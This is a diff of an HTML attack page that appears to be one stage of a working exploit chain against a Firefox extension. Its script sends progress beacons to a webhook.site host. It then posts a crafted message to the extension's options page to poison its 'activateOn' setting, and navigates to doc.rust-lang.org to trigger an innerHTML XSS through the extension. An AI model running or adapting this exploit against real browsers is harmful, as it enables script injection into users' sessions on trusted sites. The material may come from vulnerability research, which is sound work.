@@ -4,25 +4,23 @@
 <body>
   <script>
     async function run() {
-      fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=2_arrived');
+      fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=2_arrived', { keepalive: true });
 
-      // 1. Give cs.js 3 seconds to run, trigger the SW import, and send message to background
-      await new Promise(r => setTimeout(r, 3000));
+      // 1. Wait for cs.js to inject on our origin, run SW import, and send updateLastUrl to background.js
+      await new Promise(r => setTimeout(r, 2500));
 
-      // 2. Open options iframe and reset activateOn
+      // 2. Open options iframe to reset activateOn back to the real origin
       const iframe = document.createElement('iframe');
       iframe.src = 'moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html';
       document.body.appendChild(iframe);
 
       iframe.onload = () => {
-        iframe.contentWindow.postMessage({
-          activateOn: 'https://doc.rust-lang.org/',
-          href: 'https://doc.rust-lang.org/'
-        }, '*');
+        const payload = 'https://doc.rust-lang.org/#https://doc.rust-lang.org/';
+        iframe.contentWindow.postMessage(payload, '*');
 
-        fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=redirecting_to_target');
+        fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=reset_and_redirecting', { keepalive: true });
 
-        // 3. Wait 2 full seconds for background.js to commit storage before navigating
+        // 3. Wait for storage write, then navigate to target to fire innerHTML XSS
         setTimeout(() => {
           window.location.href = 'https://doc.rust-lang.org/stable/std/';
         }, 2000);
